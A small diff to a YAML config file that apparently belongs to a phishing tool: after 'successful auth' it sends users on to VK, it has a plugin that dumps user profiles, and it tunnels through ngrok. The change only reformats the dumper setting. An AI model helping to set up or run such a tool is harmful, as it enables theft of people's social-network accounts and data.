@@ -4,8 +4,7 @@ exit: https://vk.com/im # User will go to this page after successful auth
 port: 3000 # Port to server listen on
 
 plugins: # List of plugins & their settings
-  dumper: # Dumper of user profiles
-    enabled: true
+  dumper: true # Dumper of user profiles, set `true` for enable, `false` for disable
   ngrok: # Ngrok config, see https://ngrok.com/docs#config
     region: eu
     # if you have any 
